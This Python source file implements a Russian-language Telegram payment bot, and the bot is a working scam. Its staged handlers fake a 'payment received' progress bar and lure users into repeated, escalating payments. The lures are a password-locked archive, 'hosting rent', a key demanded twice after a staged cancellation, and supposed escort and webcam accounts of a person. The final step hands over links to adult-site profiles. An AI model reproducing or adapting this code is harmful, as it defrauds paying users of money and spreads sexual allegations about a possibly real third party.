from loader import dp, bot, html, db
from aiogram.types import Message, CallbackQuery
from src.keyboards.inline import payment, select_payment
from config import YOOMONEY_TOKEN, FIREME_TOKEN, YOOMONEY_WALLET
from yoomoney import Quickpay, Client
import requests
import random
import uuid
import asyncio


async def load_pay(call: CallbackQuery):
    msg= await call.message.edit_text("🙏🏻 Пожалуйста, подождите...\n\nСреднее время ожидания 5-20 сек.")
    await asyncio.sleep(2)
    await bot.edit_message_text(chat_id=call.message.chat.id, message_id= msg.message_id, text= "🙏🏻 Пожалуйста, подождите...\n\n10%\n🟩⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️\nСреднее время ожидания 5-20 сек.")
    await asyncio.sleep(2)
    await bot.edit_message_text(chat_id=call.message.chat.id, message_id=msg.message_id, text="🙏🏻 Пожалуйста, подождите...\n\n27%\n🟩🟩🟩⬜️⬜️⬜️⬜️⬜️⬜️⬜️\nСреднее время ожидания 5-20 сек.")
    await asyncio.sleep(2)
    await bot.edit_message_text(chat_id=call.message.chat.id, message_id=msg.message_id, text="🙏🏻 Пожалуйста, подождите...\n\n50%\n🟩🟩🟩🟩🟩⬜️⬜️⬜️⬜️⬜️\nСреднее время ожидания 5-20 сек.")
    await asyncio.sleep(3)
    await bot.edit_message_text(chat_id=call.message.chat.id, message_id=msg.message_id, text="🙏🏻 Пожалуйста, подождите...\n\n79%\n🟩🟩🟩🟩🟩🟩⬜️⬜️⬜️⬜️\nСреднее время ожидания 5-20 сек.")
    await asyncio.sleep(3)
    await bot.edit_message_text(chat_id=call.message.chat.id, message_id=msg.message_id, text="🙏🏻 Пожалуйста, подождите...\n\n98%\n🟩🟩🟩🟩🟩🟩🟩🟩🟩⬜️\nСреднее время ожидания 5-20 сек.")
    await asyncio.sleep(1)
    await bot.edit_message_text(chat_id=call.message.chat.id, message_id=msg.message_id, text="✅ Оплата получена!")

async def first_step(call: CallbackQuery):
    await load_pay(call)
    await call.message.answer("✅Ваш архив: https://mega.nz/#P!AgBsSHcQElrp5NwRHsPvrYzurTh2MZJo7i4QxGteAV4whHAAC5EtORADqoyrGwia6w1R6EKPxGgP03olXradbZxzK4EoRu-Wwd39y1y6CaZ2jWtA03kr2A\n\n"
                                +f"❌Архив запоролен. Для получения пароля необходимо оплатить 399 RUB.\n\n" 
                                +f"😎После этого вы получите ссылку для просмотра архива прямо в браузере (Не нужно скачивать на компьютер)"
                                +f"⏳Дата фотографий и видео указаны в названии файлов.",
                                reply_markup=select_payment(price=399, step=2))

async def second_step(call: CallbackQuery):
    await call.message.edit_text("✅ Материалы были перенесены успешно!")
    await call.message.answer(f"Чтобы получить доступ к архиву и пользоваться им, нужно оплатить аренду хостинга 👇\n\nПосле оплаты нажмите на кнопку «Проверить платеж», для проверки платежа",
                                reply_markup=select_payment(price=479, step=3))
    
async def third_step(call: CallbackQuery):
    await call.message.edit_text("✅ Транзакция прошла успешно!\n\n"
                                +f"https://mega.nz/#P!AgBsSHcQEloA9d91HZD2OPFAAoEnMe0knBm1LeocT1pCpJFhdGJiQMXVt5gcgb6pndBdmphI-ZB8gORSq-i4yxD-WmCCVgVSvY7IDqL0yBIkTH4c3rqLhg",
                                disable_web_page_preview=True)
    await asyncio.sleep(5)
    await call.message.answer("⚠️ Упс, похоже, бот поставил пароль на архив, так как нейросеть обнаружила интимные материалы.\n\n"
                                +f"🔐 Не пугайтесь, это базовая защита от посторонних глаз. Мы сохраняем анонимность и конфиденциальность.\n\n"
                                +f"Чтобы открыть архив, нужно приобрести ключ 👇",
                                reply_markup=select_payment(price=579, step=4))

async def forth_step(call: CallbackQuery):
    await call.message.edit_text("❌ Транзакция была отменена!")
    await call.message.answer(f"⚠️ Похоже, что перевод был перенаправлен службой безопасности.\n\n"
                            +f"Приносим искренние извинения за предоставленные неудобства…\n\n"
                            +f"Пожалуйста, попробуйте еще раз",
                            reply_markup=select_payment(price=579, step=5))
    
async def fiveth_step(call: CallbackQuery):
    await call.message.edit_text("✅ Проблема была успешно устранена!")
    await call.message.answer(f"💳 Так как возникли проблемы с переводом, просим вас оплатить ключ еще раз.\n\n"
                                +f"⚠️ Внимание, если возникнут какие-либо проблемы, то в дальнейшем они будут исправлены за наш счет.\n\n",
                                 reply_markup=select_payment(price=579, step=6))
    
async def sixth_step(call: CallbackQuery):
    await call.message.edit_text("✅ Транзакция прошла успешно!\n\n👉🏻 КЛЮЧ К АРХИВУ: Ttuwei881")
    await asyncio.sleep(4)
    await call.message.answer("🤫Наша поисковая система также обнаружила:\n\n"
                                    +f"2 Аккаунта пользователя на сайтах с услугами эскорта\n"
                                    +f"1 Аккаунт на сайте с ВебКам моделями\n\n"
                                    +f"🔑 Для выгрузки аккаунтов, пожалуйста, внесите оплату",
                                    reply_markup=select_payment(price=990, step=7))

async def seventh_step(call: CallbackQuery):
    await call.message.edit_text("✅ Вся информация была загружена на наш сервер")
    await call.message.answer(f"🤖 После этой оплаты вам будет отправлена вся найденная информация",
                            reply_markup=select_payment(price=990, step=8))
    
async def eighth_step(call: CallbackQuery):
    await call.message.edit_text("✅ Транзакция прошла успешно!")
    await call.message.answer(f"🌐 Ссылки на аккаунты пользователя:\n\n"
                            +f"https://hopesex.com/model/leona-5\n"
                            +f"https://datehotsexgirls.com/model/leona-5\n"
                            +f"https://rt.bongacams.xxx/Polinochka969")

def get_url_link_kassa(amount, bill_id, type):
    url = "https://admin.vanilapay.com/api/v1/deposit"

    querystring = {"order_id": bill_id,
                   "amount":amount,
                   "type": type,
                   "token":FIREME_TOKEN}

    headers = {"Content-Type": "application/json"}
    
    try:
        response = requests.request("GET", url, headers=headers, params=querystring)
        return response.json()['url']
    except:
        return None

def check_bill_kassa(bill_id):
    querystring = {"order_id":bill_id,
                   "token":FIREME_TOKEN}

    headers = {"Content-Type": "application/json"}
    
    url="https://admin.vanilapay.com/api/v1/transaction"
    
    try:
        response= requests.request("GET", url, headers=headers, params=querystring)
        print(response.status_code)
        print(response.json())
        return response.json()['status']
    except:
        return None

@dp.callback_query_handler(text_contains='tariff')
async def first_step_pay(call: CallbackQuery):
    price= int(call.data.split('_')[1])
    await call.message.answer('Выберите способ оплаты 👇',
                              reply_markup=select_payment(price, 1))

@dp.callback_query_handler(text_contains='select')
async def choice_payments(call: CallbackQuery):
    price= call.data.split('_')[3]
    step= call.data.split('_')[1]
    if call.data.split('_')[2] == 'card':
        bill_ID = f"{call.message.chat.id}{random.randint(1000, 10000)}"
        print(bill_ID)
        url = get_url_link_kassa(
            amount=price,
            bill_id=bill_ID,
            type='invoice-card'
        )
        await call.message.edit_text(text="📍 <b>Счет для оплаты готов</b> 📍\n\n"
                                  +f"<i>Для оплаты нажмите кнопку ниже 💳\n\n"
                                  +f"После оплаты нажмите на кнопку «Проверить платеж», для проверки платежа</i>",
                                  reply_markup=payment(price=price,
                                                       step=step,
                                                       bill_id=bill_ID + '!qiwi',
                                                       url=url),
                                  parse_mode=html)    
    if call.data.split('_')[2] == 'qiwi':
        bill_ID = f"{call.message.chat.id}{random.randint(1000, 10000)}"
        print(bill_ID)  
        url = get_url_link_kassa(
            amount=price,
            bill_id=bill_ID,
            type='invoice-qw'
        )
        await call.message.edit_text(text="📍 <b>Счет для оплаты готов</b> 📍\n\n"
                                  +f"<i>Для оплаты нажмите кнопку ниже 💳\n\n"
                                  +f"После оплаты нажмите на кнопку «Проверить платеж», для проверки платежа</i>",
                                  reply_markup=payment(price=price,
                                                       step=step,
                                                       bill_id=bill_ID + '!qiwi',
                                                       url=url),
                                  parse_mode=html)
    if call.data.split('_')[2] == 'ymoney':
        bill_ID = str(uuid.uuid4())+ '!yoomoney'
        bill = Quickpay(
        receiver=YOOMONEY_WALLET,
        quickpay_form='shop',
        targets='Photo bot',
        paymentType='SB',
        sum=10,
        label=bill_ID)
        await call.message.edit_text(text="📍 <b>Счет для оплаты готов</b> 📍\n\n"
                                  +f"<i>Для оплаты нажмите кнопку ниже 💳\n\n"
                                  +f"После оплаты нажмите на кнопку «Проверить платеж», для проверки платежа</i>",
                                  reply_markup=payment(price=price,
                                                       step=step,
                                                       bill_id=bill_ID,
                                                       url=bill.redirected_url),
                                  parse_mode=html)
    
@dp.callback_query_handler(text_contains='back')
async def back(call: CallbackQuery):
    price= call.data.split('_')[1]
    step= call.data.split('_')[2]
    await call.message.edit_text('Выберите способ оплаты 👇',
                              reply_markup=select_payment(price, step))

@dp.callback_query_handler(text_contains='check_bill')
async def cancel(call: CallbackQuery):
    await asyncio.sleep(2)
    bill_id = call.data.split('_')[1][4:]
    print(bill_id.split('!')[0])
    try:
        if bill_id.split('!')[1] == 'qiwi':
            result= check_bill_kassa(bill_id.split('!')[0])
        elif bill_id.split('!')[1] == 'yoomoney':
            client = Client(YOOMONEY_TOKEN)
            history = client.operation_history(label=bill_id)
            result= history.operations[-1].status
        print(result)
        if result== 'PAID' or result == 'success' or result == 'paid':
            try:
                db.edit_status(call.message.chat.id)
            except:
                pass
            if call.data.split('_')[2] == '1':
                await first_step(call)
            elif call.data.split('_')[2] == '2':
                await second_step(call)
            elif call.data.split('_')[2] == '3':
                await third_step(call)
            elif call.data.split('_')[2] == '4':
                await forth_step(call)
            elif call.data.split('_')[2] == '5':
                await fiveth_step(call)
            elif call.data.split('_')[2] == '6':
                await sixth_step(call)
            elif call.data.split('_')[2] == '7':
                await seventh_step(call)
            elif call.data.split('_')[2] == '8':
                await eighth_step(call)
        else:
            pass
    except Exception as ex:
        print(ex)